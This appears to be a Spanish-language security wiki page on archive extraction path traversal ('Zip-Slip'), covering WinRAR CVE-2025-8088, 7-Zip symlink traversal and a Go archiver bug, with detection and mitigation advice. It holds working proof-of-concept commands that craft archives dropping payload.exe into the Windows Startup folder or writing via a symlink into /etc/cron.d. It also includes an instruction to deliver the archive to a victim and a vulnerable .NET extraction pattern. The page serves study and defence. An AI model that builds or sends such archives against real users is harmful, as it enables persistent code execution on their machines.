# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Descripción general

Muchos formatos de archivo (ZIP, RAR, TAR, 7-ZIP, etc.) permiten que cada entrada incluya su propia **ruta interna**. Cuando una utilidad de extracción respeta ciegamente esa ruta, un nombre de archivo manipulado que contenga `..` o una **ruta absoluta** (por ejemplo, `C:\Windows\System32\`) se escribirá fuera del directorio elegido por el usuario.
Esta clase de vulnerabilidad se conoce ampliamente como *Zip-Slip* o **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Las consecuencias van desde sobrescribir archivos arbitrarios hasta lograr directamente **remote code execution (RCE)** al colocar un payload en una ubicación de **auto-run**, como la carpeta *Startup* de Windows.

## Causa raíz

1. El atacante crea un archivo que contiene uno o más encabezados de archivo con:
* Secuencias de traversal relativas (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Rutas absolutas (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* O **symlinks** manipulados que se resuelven fuera del directorio objetivo (común en ZIP/TAR sobre *nix*).
2. La víctima extrae el archivo con una herramienta vulnerable que confía en la ruta incluida (o sigue los symlinks) en lugar de sanitizarla o forzar la extracción dentro del directorio elegido.
3. El archivo se escribe en la ubicación controlada por el atacante y se ejecuta/carga la próxima vez que el sistema o el usuario activa esa ruta.

### Traversal de `.NET` `Path.Combine` + `ZipArchive`

Un anti-pattern común en .NET consiste en combinar el destino previsto con `ZipArchiveEntry.FullName`, controlado por el usuario, y extraerlo sin normalizar la ruta:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- Si `entry.FullName` comienza con `..\\`, realiza un traversal; si es una **ruta absoluta**, el componente de la izquierda se descarta por completo, lo que produce una **escritura arbitraria de archivos** como identidad de extracción.
- Archivo de prueba de concepto para escribir en un directorio `app` hermano supervisado por un escáner programado:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Depositar ese ZIP en la bandeja supervisada da como resultado `C:\samples\app\0xdf.txt`, demostrando traversal fuera de `C:\samples\queue\` y habilitando capacidades posteriores (por ejemplo, DLL hijacks).

## Ejemplo del mundo real – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR para Windows (incluidos la CLI `rar` / `unrar`, la DLL y el código fuente portable) no validaba los nombres de archivo durante la extracción.  
Un archivo RAR malicioso que contenga una entrada como:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
terminaría **fuera** del directorio de salida seleccionado y dentro de la carpeta *Startup* del usuario. Después del inicio de sesión, Windows ejecuta automáticamente todo lo que esté allí, proporcionando RCE *persistent*.<sup>[[5]](#references)</sup>

### Creación de un archivo PoC (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opciones utilizadas:
* `-ep`  – almacena las rutas de los archivos exactamente como se proporcionan (no elimina el `./` inicial).

Entrega `evil.rar` a la víctima e indícale que lo extraiga con una versión vulnerable de WinRAR.

### Explotación observada en la naturaleza

ESET informó sobre campañas de spear-phishing de RomCom (Storm-0978/UNC2596) que adjuntaban archivos RAR aprovechando CVE-2025-8088 para desplegar backdoors personalizados y facilitar operaciones de ransomware.<sup>[[5]](#references)</sup>

## Casos más recientes (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: Las entradas ZIP que eran **symbolic links** se desreferenciaban durante la extracción, lo que permitía a los atacantes escapar del directorio de destino y sobrescribir rutas arbitrarias. La interacción del usuario consiste simplemente en *abrir/extraer* el archivo.<sup>[[1]](#references)</sup>
* **Afectado**: 7-Zip 21.02–24.09 (builds de Windows y Linux). Corregido en **25.00** (julio de 2025) y posteriores.
* **Ruta de impacto**: Sobrescribir `Start Menu/Programs/Startup` o ubicaciones donde se ejecutan servicios → el código se ejecuta en el siguiente inicio de sesión o reinicio del servicio.
* **PoC rápida (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
En una build corregida, `/etc/cron.d` no se modificará; el symlink se extrae como un enlace dentro de `/tmp/target`.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` sigue las entradas `../` y las entradas ZIP con symlinks, escribiendo fuera de `outputDir`.<sup>[[2]](#references)</sup>
* **Afectado**: `github.com/mholt/archiver` ≤ 3.5.1 (el proyecto está actualmente deprecated).
* **Corrección**: Cambia a `mholt/archives` ≥ 0.1.0 o implementa comprobaciones de rutas canónicas antes de escribir.
* **Reproducción mínima**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Consejos de detección

* **Inspección estática** – Enumera las entradas del archivo y marca cualquier nombre que contenga `../`, `..\\`, *rutas absolutas* (`/`, `C:`) o entradas de tipo *symlink* cuyo destino esté fuera del directorio de extracción.
* **Canonicalización** – Asegúrate de que `realpath(join(dest, name))` siga comenzando por `dest`. Recházalo en caso contrario.<sup>[[3]](#references)</sup>
* **Extracción en sandbox** – Descomprime en un directorio desechable utilizando un extractor *safe* (por ejemplo, `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) y verifica que las rutas resultantes permanezcan dentro del directorio.
* **Monitorización de endpoints** – Genera una alerta cuando se escriban nuevos ejecutables en ubicaciones `Startup`/`Run`/`cron` poco después de que WinRAR/7-Zip/etc. abra un archivo.

## Mitigación y hardening

1. **Actualiza el extractor** – WinRAR 7.13+ y 7-Zip 25.00+ implementan sanitización de rutas/symlinks. Ninguna de las dos herramientas tiene auto-update.
2. Extrae los archivos con “**Do not extract paths**” / “**Ignore paths**” cuando sea posible.
3. En Unix, elimina privilegios y monta un **chroot/namespace** antes de la extracción; en Windows, utiliza **AppContainer** o un sandbox.
4. Si escribes código personalizado, normaliza con `realpath()`/`PathCanonicalize()` **antes** de crear/escribir, y rechaza cualquier entrada que escape del destino.

## Casos adicionales afectados / históricos

* 2018 – Advisory masivo de *Zip-Slip* por Snyk que afectaba a muchas librerías de Java/Go/JS.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011, un traversal similar durante la combinación `-ao`.
* 2025 – `go-slug` de HashiCorp (CVE-2025-0377), traversal durante la extracción de TAR en slugs (parche en v1.2).<sup>[[7]](#references)</sup>
* Cualquier lógica de extracción personalizada que no invoque `PathCanonicalize` / `realpath` antes de escribir.

## Referencias

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
